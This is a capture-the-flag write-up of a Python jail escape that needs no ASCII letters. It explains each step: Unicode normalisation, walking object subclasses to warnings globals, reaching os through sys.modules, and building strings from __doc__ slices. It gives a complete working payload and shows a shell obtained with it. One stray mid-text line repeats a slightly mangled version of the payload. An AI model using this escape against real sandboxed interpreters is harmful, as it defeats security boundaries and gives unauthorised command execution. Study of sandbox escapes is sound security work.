
We're given the source code to a Python interactive console with various restrictions placed on us.

```python

class FrozenDict(dict):
	def __init__(self, v):
		super().__init__(v)
	def __setitem__(self, k, v):
		# no changey for you
		print("bonked")
		exit(1)
```

Firstly, we're given a FrozenDict class, which will exit whenever we attempt to set an item, e.g. `my_dict["abc"] = 1`.


```python
def restrict(buffer_list):
	# no ascii letters for you, muwhaahahha
	for line in buffer_list:
		for char in string.ascii_letters:
			if char in line:
				print("bonked")
				exit(1)
			
	return True
```

Next, we're given a function which takes in a list of strings from the console and then checks each character if it's inside string.ascii_letters (i.e. `abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ`).

Then, we have some setup for the interactive console. Importantly, our shell will run `restrict()` on our input and assuming that does not exist, then runs an `exec` command on our input with a frozen empty dict of builtins.

`__builtins__` usually stores the built in functions of Python, for example:
```
>>> dir(__builtins__)
['ArithmeticError', 'AssertionError', 'AttributeError', 'BaseException', 'BlockingIOError', 'BrokenPipeError', 'BufferError', 'BytesWarning', ... , 'pow', 'print', 'property', 'quit', 'range', 'repr', 'reversed', 'round', 'set', 'setattr', 'slice', 'sorted', 'staticmethod', 'str', 'sum', 'super', 'tuple', 'type', 'vars', 'zip']
```

Therefore, when our `exec` sets `__builtins__` to an empty dictionary, we have no built-in methods available to us, such as `import`.

We now have the challenge of attempting to get a shell, without using any ascii characters in our input (otherwise, the challenge will kick us out.) While `os.system("/bin/bash")` feels impossible with these restrictions, we can use various tricks to eventually do it.

Firstly, we'll look at the ASCII restriction. A fun(?) feature of the Python interactive console is that given Unicode characters, it will normalise them for us. Therefore, the following below will be evaluated as a regular `print` function.

```
>>> 𝔭𝔯𝔦𝔫𝔱("hello")
hello
```

Therefore, we can simply replace any reference to these characters to the Gothic unicode equivalent.

```python
import string

fake_alphabet = "𝔞 𝔟 𝔠 𝔡 𝔢 𝔣 𝔤 𝔥 𝔦 𝔧 𝔨 𝔩 𝔪 𝔫 𝔬 𝔭 𝔮 𝔯 𝔰 𝔱 𝔲 𝔳 𝔴 𝔵 𝔶 𝔷".split(" ")
real_alphabet = string.ascii_lowercase
trans = str.maketrans("".join(real_alphabet), "".join(fake_alphabet))
```

We still don't have access to builtins such as `print` or `import`. However, other modules do already have existing access to these builtins. Therefore, if we can somehow access another module within our restrictions, we may be able to gain access to new modules such as `os`.

For clarity, I will not use the Unicode bypass in the following examples. Firstly, we can initiate a tuple and then get access to the `Tuple` class:

```
>>> ()
()
>>> ().__class__
<class 'tuple'>
```

At this point, we can then reference the `__base__` of the tuple class, which references the parent class of the tuple class. This gives us access to the generic `object` class.

```
>>> ().__class__.__base__
<class 'object'>
```

From there, we can then use the `__subclasses__()` function, which returns all the subclasses of the object class, which is quite a few different classes.

```
>>> ().__class__.__base__.__subclasses__()
[<class 'type'>, <class 'weakref'>, <class 'weakcallableproxy'>, <class 'weakproxy'>, <class 'int'>, <class 'bytearray'>, <class 'bytes'>, <class 'list'>, <class 'NoneType'>, <class 'NotImplementedType'>, <class 'traceback'>, <class 'super'>, <class 'range'>, <class 'dict'>, <class 'dict_keys'>, <class 'dict_values'>, <class 'dict_items'>, <class 'dict_reversekeyiterator'>, ..., <class 'pickle._Unframer'>, <class 'pickle._Pickler'>, <class 'pickle._Unpickler'>, <class 'apport.packaging.PackageInfo'>, <class 'gettext.NullTranslations'>]
```

This is exciting, as we now have access to a various number of classes defined in external modules. The example above shows classes defined in the `pickle` library.

A very common one that is used in this list is `<class 'warnings.catch_warnings'>`, as it has references to the `os` module, which is our final goal for getting a shell. To select one, we can simply index this list at whatever index this module is at. In this case for me, it's at 140.

```
>>> ().__class__.__base__.__subclasses__()[140]
<class 'warnings.catch_warnings'>
```

From here, we can then begin enumerating this class to find `os`. We can look at the class' `__init__` function and use the `__globals__` property to find global variables defined within this function. 

print("""[*().__𝔠𝔩𝔞𝔰𝔰__.__𝔟𝔞𝔰𝔢__.__𝔰𝔲𝔟𝔠𝔩𝔞𝔰𝔰𝔢𝔰__()[140].__𝔦𝔫𝔦𝔱__.__𝔤𝔩𝔬𝔟𝔞𝔩𝔰__.𝔳𝔞𝔩𝔲𝔢𝔰()][8].𝔪𝔬𝔡𝔲𝔩𝔢𝔰[().__doc__[34]+().__doc__[19]].system([].__doc__[17::79])""".translate(trans))

```
{'__name__': 'warnings', '__doc__': 'Python part of the warnings subsystem.', '__package__': '', '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x7f099ecdfcd0>, '__spec__': ModuleSpec(name='warnings', loader=<_frozen_importlib_external.SourceFileLoader object at 0x7f099ecdfcd0>, origin='/usr/lib/python3.9/warnings.py'), '__file__': '/usr/lib/python3.9/warnings.py', '__cached__': '/usr/lib/python3.9/__pycache__/warnings.cpython-39.pyc', '__builtins__': {'__name__': 'builtins', '__doc__': "Built-in functions, exceptions, and other objects.\n\nNoteworthy: None is the `nil' object; Ellipsis represents `...' in slices.", '__package__': '', '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': ModuleSpec(name='builtins', loader=<class '_frozen_importlib.BuiltinImporter'>, origin='built-in'), '__build_class__': <built-in function __build_class__>, '__import__': <built-in function __import__>, 'abs': <built-in function abs>, 'sys': <module 'sys' (built-in)>, ... }
```

I've removed some results for brevity, but note here that we also have access to the builtins that the `exec` call removed. However, the most important one here is the `sys` module. To reference this, I decided to take the values of this dictionary, convert it to a list then reference the `sys` module with the index.

```
>>> [*().__class__.__base__.__subclasses__()[140].__init__.__globals__.values()][8]
<module 'sys' (built-in)>
```

(Note that the index may differ, depending on the remote version)

Once we have the `sys` module, we can look at the `modules` property of the `sys` module.

```
>>> [*().__class__.__base__.__subclasses__()[140].__init__.__globals__.values()][8].modules
{'sys': <module 'sys' (built-in)>, 'builtins': <module 'builtins' (built-in)>, '_frozen_importlib': <module 'importlib._bootstrap' (frozen)>, '_imp': <module '_imp' (built-in)>, '_thread': <module '_thread' (built-in)>, '_warnings': <module '_warnings' (built-in)>, ... 'os': <module 'os' from '/usr/lib/python3.9/os.py'>}
```

Again, there are many modules referenced but most importantly, there's the `os` module we've been looking for!

However, we can't just use the string `"os"` to refer to it, due to the ascii character restriction. This is fine however, as we can simply craft the os string by slicing pre-existing strings within the `__doc__` property of existing objects. For example, the `__doc__` property of a list gives us this string:

```python
>>> [].__doc__
'Built-in mutable sequence.\n\nIf no argument is given, the constructor creates a new empty list.\nThe argument must be an iterable if specified.'
```

From this, we can simply select the indexes of this string to craft `"os"`.

```
>>> [*().__class__.__base__.__subclasses__()[140].__init__.__globals__.values()][8].modules[().__doc__[34]+().__doc__[19]]
<module 'os' from '/usr/lib/python3.9/os.py'>
```

At this point, we can reference the `system` function using our Unicode bypass (not included in the code block below).

```
>>> [*().__class__.__base__.__subclasses__()[140].__init__.__globals__.values()][8].modules[().__doc__[34]+().__doc__[19]].system
<built-in function system>
```

Finally, we need to craft our `/bin/bash` string. However, we can get away with just doing `sh`. Therefore, we'll craft it in the same way as we did the `"os"`.

```
>>> [].__doc__[17]+[].__doc__[54]
'sh'
```

Finally, we can put this all together for our payload:

```
[*().__class__.__base__.__subclasses__()[140].__init__.__globals__.values()][8].modules[().__doc__[34]+().__doc__[19]].system([].__doc__[17]+[].__doc__[54])
```

We can then apply our gothic unicode translation:

```python
import string

fake_alphabet = "𝔞 𝔟 𝔠 𝔡 𝔢 𝔣 𝔤 𝔥 𝔦 𝔧 𝔨 𝔩 𝔪 𝔫 𝔬 𝔭 𝔮 𝔯 𝔰 𝔱 𝔲 𝔳 𝔴 𝔵 𝔶 𝔷".split(" ")
real_alphabet = string.ascii_lowercase
trans = str.maketrans("".join(real_alphabet), "".join(fake_alphabet))

payload = "[*().__class__.__base__.__subclasses__()[140].__init__.__globals__.values()][8].modules[().__doc__[34]+().__doc__[19]].system([].__doc__[17]+[].__doc__[54])".translate(trans)

print(payload)
```

Which gives us the payload: 

```
[*().__𝔠𝔩𝔞𝔰𝔰__.__𝔟𝔞𝔰𝔢__.__𝔰𝔲𝔟𝔠𝔩𝔞𝔰𝔰𝔢𝔰__()[140].__𝔦𝔫𝔦𝔱__.__𝔤𝔩𝔬𝔟𝔞𝔩𝔰__.𝔳𝔞𝔩𝔲𝔢𝔰()][8].𝔪𝔬𝔡𝔲𝔩𝔢𝔰[().__𝔡𝔬𝔠__[34]+().__𝔡𝔬𝔠__[19]].𝔰𝔶𝔰𝔱𝔢𝔪([].__𝔡𝔬𝔠__[17]+[].__𝔡𝔬𝔠__[54])
```

Running the payload gives us a shell, without using any ASCII characters.

```
Python 3.9.2 (default, Feb 28 2021, 17:03:44) 
[GCC 10.2.1 20210110] on linux
Type "help", "copyright", "credits" or "license" for more information.
(InteractiveConsole)
>>> [*().__𝔠𝔩𝔞𝔰𝔰__.__𝔟𝔞𝔰𝔢__.__𝔰𝔲𝔟𝔠𝔩𝔞𝔰𝔰𝔢𝔰__()[140].__𝔦𝔫𝔦𝔱__.__𝔤𝔩𝔬𝔟𝔞𝔩𝔰__.𝔳𝔞𝔩𝔲𝔢𝔰()][8].𝔪𝔬𝔡𝔲𝔩𝔢𝔰[().__𝔡𝔬𝔠__[34]+().__𝔡𝔬𝔠__[19]].𝔰𝔶𝔰𝔱𝔢𝔪([].__𝔡𝔬𝔠__[17]+[].__𝔡𝔬𝔠__[54])
$ id
uid=1000(josh) gid=1000(josh) groups=1000(josh)
```